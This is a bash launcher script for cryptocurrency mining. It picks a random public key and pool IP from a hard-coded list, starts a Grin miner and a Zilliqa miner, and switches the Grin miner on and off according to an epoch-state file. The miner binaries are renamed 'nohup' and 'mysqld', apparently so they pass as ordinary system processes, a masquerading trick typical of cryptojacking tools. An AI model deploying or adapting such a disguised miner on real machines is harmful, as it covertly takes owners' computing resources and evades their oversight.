#!/bin/bash

pub[0]="025972896F819CA931B61B811A13589FCEBA6CE5D6DEC30127675FFAD5327DE6C1"
ip[0]="13.229.119.163"
pub[1]="03A2ACC10B7F6507376DA8AE6FCBB5F1384B8E78F8C6730D5DD8514003A5075452"
ip[1]="13.229.79.67"
pub[2]="02699F19FB9DC7D945F6A187A07B8A9C58A7D737C9DD391B21BF252C1E020B36C7"
ip[2]="35.230.13.9"
pub[3]="0288AD97BBA04D46A9DC9E6EDAA3945B202A3F381151E7FB0D032167855E57BEA2"
ip[3]="34.73.2.6"
pub[4]="0326C1163343B3CEC2AFE69217B86CF9EC5144CF2B9E3AE7AB21136EF645A5270A"
ip[4]="35.233.154.251"
pub[5]="0213C1BF918001D64D745D5918DD3C0378BBD868454FF57BBE3FEB0582589C51B9"
ip[5]="35.247.88.17"
pub[6]="030F00621111EAD7511D1DE140733FE0A1E6B0546D6F8EC1733A32E2052AAE981F"
ip[6]="35.203.159.174"
pub[7]="03C1740D0EEC8148BD5865D19C192D04DE7DB220970B1C68F179FFA7F9D937CE43"
ip[7]="35.247.101.217"
pub[8]="0225ADD2FDAC59893E882B45E23ACBA861797198190FEB247858A20B3DCC648BB1"
ip[8]="35.197.3.214"
pub[9]="03B1D292B0D11DDFEE4B62167502498841CCAAC70B940239B44C96DED0F188A3D4"
ip[9]="35.203.188.112"
pub[10]="02FEAF1F61A32904FD699DFA8EE80B5A19C75D1F95AB235C4910B1315A2DB7D159"
ip[10]="35.247.115.212"
pub[11]="03C561788BA36619BDB6F068F4BAC354F41A8E73A07B2CEC86E5BF101688359630"
ip[11]="35.238.197.6"
pub[12]="035ED878E38C3A9FD829CE76FE63D29730D1610901E2955A421035CE230A662EA8"
ip[12]="35.239.230.167"
pub[13]="025F546ED73A0F89E559BF180E2DDA12CAB83023A3AA6F9AFDF42BB5B42B972A58"
ip[13]="104.198.209.106"

rand=$[$RANDOM % ${#pub[@]}]
random_pub=${pub[$rand]}
random_ip=${ip[$rand]}
echo ${random_pub}
echo ${random_ip}

cd grin-miner && ./target/release/nohup &
cd durian && ./mysqld -P zil://${random_pub}.worker_2@${random_ip}:4202 &

while true
    do
    sleep 1
    epoch_state="$(tac epochstate.txt | egrep -m 1 . | tail -c 3)"
    echo ${epoch_state}
    if [ "$epoch_state" = "97" ] ; then
        if pgrep nohup; then pkill -9 nohup; fi
        echo "Terminated Grin"
    elif [ "$epoch_state" = "02" ] ; then
        cd grin-miner && ./target/release/nohup &
        echo "Starting Grin"
    else
        echo "Doing Nothing"
    fi
    sleep 59
    done
